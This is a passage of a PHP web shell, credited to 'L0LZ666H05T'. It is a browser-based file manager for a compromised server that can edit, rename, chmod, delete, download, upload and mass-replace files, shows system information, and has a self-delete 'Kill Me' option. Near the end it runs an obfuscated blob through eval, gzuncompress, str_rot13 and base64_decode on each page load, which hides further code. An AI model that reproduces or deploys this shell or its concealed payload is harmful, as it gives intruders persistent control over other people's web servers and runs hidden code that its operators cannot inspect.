          <input style="width:100%;" type="submit" name="submit" value="RENAME">
        </td>
      </tr>
    </form>
    <?php exit();
    }
}
function chmods($post, $filename)
{
    if ($_GET['do'] == $post) {
        if (isset($_POST['submit'])) {
            if (@chmod($filename, $_POST['mode'])) { ?>
        <tr>
            <td>
                <?php print @success("Chmod Success"); ?>
            </td>
        </tr>
        <?php } else { ?>
        <tr>
            <td>
                <?php print @failed("Chmod Failed"); ?>
            </td>
        </tr>
        <?php }
        } ?>
    <thead>
      <tr>
        <th>
          <a class="back" href="?path=<?php print @cwd(); ?>">CHANGE MODE</a>
        </th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <input style="width:98.5%;" type="text" name="mode" value="<?php print @substr(
              sprintf('%o', @fileperms($filename)),
              -4
          ); ?>">
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit">
        </td>
      </tr>
    </form>
    <?php exit();
    }
}
function delete($filename)
{
    if (@is_dir($filename)) {
        $scandir = @scandir($filename);
        foreach ($scandir as $object) {
            if ($object != '.' && $object != '..') {
                if (@is_dir($filename . DIRECTORY_SEPARATOR . $object)) {
                    @delete($filename . DIRECTORY_SEPARATOR . $object);
                } else {
                    @unlink($filename . DIRECTORY_SEPARATOR . $object);
                }
            }
        }
        if (@rmdir($filename)) {
            return true;
        } else {
            return false;
        }
    } else {
        if (@unlink($filename)) {
            return true;
        } else {
            return false;
        }
    }
}
function download($post, $filename)
{
    if ($_GET['do'] == $post) {
        @ob_clean();
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header(
            'Content-Disposition: attachment; filename="' .
                basename($filename) .
                '"'
        );
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filename));
        readfile($filename);

        @readfile($filename);
        exit(0);
    }
}
function backup($post, $filename)
{
    if ($_GET['do'] == $post) {
        $file = @file_get_contents($filename);
        $fp = @fopen($filename . ".bak", "w");
        @fwrite($fp, $file);
        @fclose($fp);
    }
}
function killme($post)
{
    if ($_GET['do'] == 'killme') {
        $killme = unlink(@cwd() . DIRECTORY_SEPARATOR . $_SERVER['PHP_SELF']);
        if ($killme) { ?>
      <tr>
        <td colspan="5">
          <?php print @success("Good Bye :)"); ?>
          <?php print @home(); ?>
        </td>
      </tr>
      <?php exit();} else { ?>
      <tr>
        <td colspan="5">
          <?php print @failed("Permission Danied"); ?>
        </td>
      </tr>
      <?php exit();}
    }
}
function home()
{
    $home =
        "http://" .
        $_SERVER['HTTP_HOST'] .
        $_SERVER['SCRIPT_NAME'] .
        ""; ?> <script type="text/javascript">window.location='<?php print $home; ?>';</script> <?php
}
function logout($post)
{
    if ($_GET['do'] == 'logout') {
        unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
        @home();
    }
}
if (isset($_GET['home'])) {
    @home();
}
if ($_GET['do'] == 'delete') {
    if (@delete($_GET['file'])) {
        header("Location: ?" . cwd() . "");
    }
}
@edit("edit", $_GET['file']);
@renames("rename", $_GET['file']);
@chmods("chmod", $_GET['file']);
@backup("backup", $_GET['file']);
@download("download", $_GET['file']);
@upload("upload");
@making("making");
@masswriter("masswrite");
@killme("killme");
@logout('logout');
?>
  <thead>
    <tr>
      <th colspan="5">
        System : <?php print @php_uname(); ?>
      </th>
    </tr>
    <tr>
      <th colspan="5">
        <a class="tools" href="?path=<?php print @cwd(); ?>&home">Home</a>
        <a class="tools" href="?path=<?php print @cwd(); ?>&encode">Encode</a>
        <a class="tools" href="?path=<?php print @cwd(); ?>&do=upload">Upload</a>
        <a class="tools" href="?path=<?php print @cwd(); ?>&do=making">Make File</a>
        <a class="tools" href="?path=<?php print @cwd(); ?>&do=masswrite">Replace File</a>
        <a class="tools" href="?path=<?php print @cwd(); ?>&do=killme">Kill Me</a>
        <a class="tools" href="?path=<?php print @cwd(); ?>&do=logout">Logout</a>
      </th>
    </tr>
    <tr>
      <th colspan="5">
            <?php print pwd(); ?> ( <?php permission(cwd(), perms(cwd())); ?> )
      </th>
    </tr>
  </thead>
  <tbody>
<?php
$getPATH = @scandir(@cwd());
foreach ($getPATH as $dir) {
    if (!is_dir($dir) || $dir === '.' || $dir === '..') {
        continue;
    } ?>
  <tr class="hover">
    <td class="img"> 
      <img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
    </td>
    <td>
      <a href="?path=<?php print @cwd() .
          DIRECTORY_SEPARATOR .
          $dir; ?>"><?php print $dir; ?></a>
    </td>
    <td>
      <center>
        <?php print @permission($dir, @perms($dir)); ?>
      </center>
    </td>
    <td>
      <center>NaN</center>
    </td>
    <td>
      <center>
      <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
        <option value="" selected>Choose . .</option>
        <option value="?path=<?php print @cwd(); ?>&do=rename&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $dir; ?>">Rename</option>
        <option value="?path=<?php print @cwd(); ?>&do=delete&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $dir; ?>">Delete</option>
        <option value="?path=<?php print @cwd(); ?>&do=chmod&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $dir; ?>">Chmod</option>
      </select>
    </center>
    </td>
  </tr>
  <?php
}
foreach ($getPATH as $file) {
    if (!is_file($file)) {
        continue;
    } ?>
  <tr class="hover">
  <?php
  print "<td class='img'><img src='";
  $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
  if ($ext == "php") {
      echo 'https://image.flaticon.com/icons/png/128/337/337947.png';
  } elseif ($ext == "html") {
      echo 'https://image.flaticon.com/icons/png/128/136/136528.png';
  } elseif ($ext == "css") {
      echo 'https://image.flaticon.com/icons/png/128/136/136527.png';
  } elseif ($ext == "png") {
      echo 'https://image.flaticon.com/icons/png/128/136/136523.png';
  } elseif ($ext == "jpg") {
      echo 'https://image.flaticon.com/icons/png/128/136/136524.png';
  } elseif ($ext == "jpeg") {
      echo 'http://i.imgur.com/e8mkvPf.png"';
  } elseif ($ext == "zip") {
      echo 'https://image.flaticon.com/icons/png/128/136/136544.png';
  } elseif ($ext == "js") {
      echo 'https://image.flaticon.com/icons/png/128/1126/1126856.png';
  } elseif ($ext == "ttf") {
      echo 'https://image.flaticon.com/icons/png/128/1126/1126892.png';
  } elseif ($ext == "otf") {
      echo 'https://image.flaticon.com/icons/png/128/1126/1126891.png';
  } elseif ($ext == "txt") {
      echo 'https://image.flaticon.com/icons/png/128/136/136538.png';
  } elseif ($ext == "ico") {
      echo 'https://image.flaticon.com/icons/png/128/1126/1126873.png';
  } elseif ($ext == "conf") {
      echo 'https://image.flaticon.com/icons/png/512/1573/1573301.png';
  } elseif ($ext == "htaccess") {
      echo 'https://image.flaticon.com/icons/png/128/1720/1720444.png';
  } elseif ($ext == "sh") {
      echo 'https://image.flaticon.com/icons/png/128/617/617535.png';
  } elseif ($ext == "py") {
      echo 'https://image.flaticon.com/icons/png/128/180/180867.png';
  } elseif ($ext == "indsc") {
      echo 'https://image.flaticon.com/icons/png/512/1265/1265511.png';
  } elseif ($ext == "sql") {
      echo 'https://img.icons8.com/ultraviolet/2x/data-configuration.png';
  } elseif ($ext == "pl") {
      echo 'http://i.imgur.com/PnmX8H9.png';
  } elseif ($ext == "pdf") {
      echo 'https://image.flaticon.com/icons/png/128/136/136522.png';
  } elseif ($ext == "mp4") {
      echo 'https://image.flaticon.com/icons/png/128/136/136545.png';
  } elseif ($ext == "mp3") {
      echo 'https://image.flaticon.com/icons/png/128/136/136548.png';
  } elseif ($ext == "git") {
      echo 'https://image.flaticon.com/icons/png/128/617/617509.png';
  } elseif ($ext == "md") {
      echo 'https://image.flaticon.com/icons/png/128/617/617520.png';
  } else {
      echo 'https://image.flaticon.com/icons/svg/833/833524.svg';
  }
  print "' class='icon'></img></td>";
  if (strlen($file) > 25) {
      $_file = substr($file, 0, 25) . "...-." . $ext;
  } else {
      $_file = $file;
  }
  ?>
    <td>
      <?php print $file; ?>
    </td>
    </td>
    <td>
      <center>
        <?php print @permission($file, @perms($file)); ?>
      </center>
    </td>
    <td>
      <center>
        <?php print @size($file); ?>
      </center>
    </td>
    <td>
      <center>
        <select style="float:right;" onclick="if (this.value) window.location=(this.value)">
        <option value="" selected>Choose . .</option>
        <option value="?path=<?php print @cwd(); ?>&do=edit&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $file; ?>">Edit</option>
        <option value="?path=<?php print @cwd(); ?>&do=rename&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $file; ?>">Rename</option>
        <option value="?path=<?php print @cwd(); ?>&do=delete&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $file; ?>">Delete</option>
        <option value="?path=<?php print @cwd(); ?>&do=chmod&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $file; ?>">Chmod</option>
        <option value="?path=<?php print @cwd(); ?>&do=backup&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $file; ?>">Backup</option>
        <option value="?path=<?php print @cwd(); ?>&do=download&file=<?php print @cwd() .
    DIRECTORY_SEPARATOR .
    $file; ?>">Download</option>
      </select>
      </center>
    </center>
    </td>
  </tr>
  <?php
}; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
?>
</tbody>
<thead>
    <tr>
        <th colspan="5" style="border:none;">&copy; copyright 2019 by L0LZ666H05T</th>
    </tr>
</thead>
</table>
</body>
</html>
